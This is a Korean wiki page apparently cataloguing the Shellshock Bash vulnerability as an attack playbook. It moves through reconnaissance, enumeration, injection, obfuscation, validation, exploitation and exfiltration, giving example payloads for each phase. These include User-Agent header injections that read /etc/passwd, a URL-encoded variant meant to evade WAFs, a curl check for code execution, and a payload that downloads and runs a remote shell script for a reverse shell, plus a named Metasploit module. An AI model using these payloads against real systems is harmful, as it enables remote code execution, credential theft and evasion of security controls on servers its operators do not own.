---
title: Shellshock
description: 
published: true
date: 2025-07-25T18:18:17.618Z
tags: 
editor: markdown
dateCreated: 2025-07-20T12:10:50.815Z
---

# Shellshock

## 개요
“Shellshock”는 Bash가 환경 변수에 선언된 함수 뒤에 이어지는 문자열을 추가 명령으로 오인해 실행하도록 만드는 구문 해석 오류 취약점이다. GNU Bash 4.3 이하가 기본 셸로 포함된 리눅스·유닉스 계열 시스템, 특히 CGI 스크립트를 호출하는 Apache 웹 서버 같은 환경이 영향을 받는다. 공격자는 HTTP 헤더나 쿼리 스트링 등 입력 경로에 `() { :; }; <명령>` 형태의 페이로드를 주입해 원격에서 Bash가 해당 명령을 수행하게 만들 수 있다. 결과적으로 원격 코드 실행을 통해 시스템 장악·정보 탈취가 가능하다.


## 분류

> 메타데이터 해석 불일치 (Metadata Interpretation Gap)  
> → 리소스 식별자 해석 불일치 (Resource Identifier Mismatch)  
> → Shellshock

## 절차

<table>
  <thead>
    <tr>
      <th>Phase</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Reconnaissance</td>
      <td>대상 도메인, 서비스, 서버 타입을 파악하고, SSL/TLS, mod_cgi 유무, 방화벽·WAF 등을 확인한다.</td>
    </tr>
    <tr>
      <td>Enumeration</td>
      <td><code>gobuster/dirb</code>로 ‘.sh’, ‘.cgi’ 경로를 스캔하고, Nmap NSE 스크립트(<code>http-shellshock</code>)로 취약 여부를 탐지한다.</td>
    </tr>
    <tr>
      <td>Injection</td>
      <td>HTTP 헤더(User‑Agent, Cookie 등)에 <code>() { :; }; &lt;명령어&gt;</code> 형태의 Shellshock payload를 삽입해, 애플리케이션 레이어 필터를 우회하고 Bash 레이어에서 실행을 유도한다.</td>
    </tr>
    <tr>
      <td>Obfuscation</td>
      <td>URL 인코딩(<code>()%20{%20:%3B%20}</code>), Base64 인코딩, 환경 변수 이름 분할, 기타 헤더 필드를 활용해 WAF 또는 서명 기반 탐지를 회피한다.</td>
    </tr>
    <tr>
      <td>Validation</td>
      <td><code>curl -i</code> 또는 <code>nc</code> 등으로 RCE 여부를 확인하고, 응답 본문이나 HTTP 상태 코드(200 vs 500)를 분석해 명령 실행 성공을 검증한다.</td>
    </tr>
    <tr>
      <td>Exploitation</td>
      <td><code>wget</code>/bash를 조합하여 리버스 셸 스크립트를 다운로드하여 실행하거나, Metasploit 모듈을 이용해 자동화된 리버스 셸을 획득한다.</td>
    </tr>
    <tr>
      <td>Exfiltration</td>
      <td>RCE로 획득한 쉘을 통해 <code>cat /etc/passwd</code> 등 시스템 파일을 탈취하거나, 권한 상승 스크립트를 실행해 추가 정보를 유출한다.</td>
    </tr>
  </tbody>
</table>
<div style="text-align: left;">
  <img
    src="/shellshock.png"
    alt="Shellshock 다이어그램"
    width="1000"
    style="display: block;
           margin: 0 0 1em 0;
           height: auto;"
  />
</div>

## 공격 기법

### Reconnaissance

<table>
  <thead>
    <tr><th>공격 이름</th><th>예시 페이로드</th><th>설명</th><th>출처</th></tr>
  </thead>
  <tbody>
    <tr>
      <td>Infrastructure Reconnaissance</td>
      <td><pre><code>nmap -sV -p80,443 target.example.com</code></pre></td>
      <td>대상 도메인·서비스 포트와 버전을 확인하고, SSL/TLS 설정·mod_cgi 지원 여부 및 방화벽, WAF 유무를 파악한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Enumeration

<table>
  <thead>
    <tr><th>공격 이름</th><th>예시 페이로드</th><th>설명</th><th>출처</th></tr>
  </thead>
  <tbody>
    <tr>
      <td>CGI Script Enumeration</td>
      <td>
        <pre><code>gobuster dir -u http://target.ip/ -w /path/to/wordlist -x sh,cgi</code></pre>
        <pre><code>nmap --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"</code></pre>
      </td>
      <td>dirb/gobuster로 쉘·CGI 스크립트 경로를 스캔한 뒤, Nmap NSE 스크립트로 해당 스크립트가 Shellshock에 취약한지 탐지한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Injection

<table>
  <thead>
    <tr><th>공격 이름</th><th>예시 페이로드</th><th>설명</th><th>출처</th></tr>
  </thead>
  <tbody>
    <tr>
      <td>HTTP Header Shellshock Injection</td>
      <td><pre><code>User-Agent: () { :; }; echo; /bin/bash -c 'cat /etc/passwd'</code></pre></td>
      <td>HTTP 헤더(User‑Agent, Cookie 등)에 Shellshock 페이로드를 삽입하여 애플리케이션 레이어 필터를 우회하고 Bash 레이어에서 임의 명령 실행을 유도한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Obfuscation

<table>
  <thead>
    <tr><th>공격 이름</th><th>예시 페이로드</th><th>설명</th><th>출처</th></tr>
  </thead>
  <tbody>
    <tr>
      <td>Payload Encoding Obfuscation</td>
      <td><pre><code>User-Agent: %28%29%20%7B%3A%3B%7D%3B%20/bin/bash%20-c%20'id'</code></pre></td>
      <td>URL 인코딩·Base64 인코딩·환경 변수 이름 분할·기타 헤더 필드를 활용하여 WAF 및 서명 기반 탐지를 회피한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Validation

<table>
  <thead>
    <tr><th>공격 이름</th><th>예시 페이로드</th><th>설명</th><th>출처</th></tr>
  </thead>
  <tbody>
    <tr>
      <td>Execution Success Verification</td>
      <td><pre><code>curl -i http://target.example.com/cgi-bin/vuln.sh \  
-H "User-Agent: () { :; }; echo; /bin/bash -c 'id'"</code></pre></td>
      <td>curl 또는 nc를 이용해 HTTP 응답 헤더·본문·상태 코드를 분석하여 명령이 정상 실행되었는지(200 vs 500 등) 검증한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exploitation

<table>
  <thead>
    <tr><th>공격 이름</th><th>예시 페이로드</th><th>설명</th><th>출처</th></tr>
  </thead>
  <tbody>
    <tr>
      <td>Reverse Shell Deployment</td>
      <td><pre><code>User-Agent: () { :; }; /bin/bash -c 'wget http://target.example.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh'</code></pre></td>
      <td>wget과 bash를 조합해 원격 스크립트를 다운로드·실행하거나, Metasploit의 <code>exploit/multi/http/apache_mod_cgi_bash_env_exec</code> 모듈을 이용해 역쉘을 획득한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

### Exfiltration

<table>
  <thead>
    <tr><th>공격 이름</th><th>예시 페이로드</th><th>설명</th><th>출처</th></tr>
  </thead>
  <tbody>
    <tr>
      <td>Data Exfiltration via RCE Shell</td>
      <td><pre><code>cat /etc/passwd</code></pre></td>
      <td>획득한 쉘에서 시스템 파일(<code>cat /etc/passwd</code>) 등을 읽어내어 권한 상승 정보나 사용자 계정 정보를 탈취한다.</td>
      <td>[1]</td>
    </tr>
  </tbody>
</table>

---

## 분류에 해당하는 문서
- [1] https://yashpawar1199.medium.com/exploiting-the-shellshock-cve-2014-6271-vulnerability-043514bea7b8  

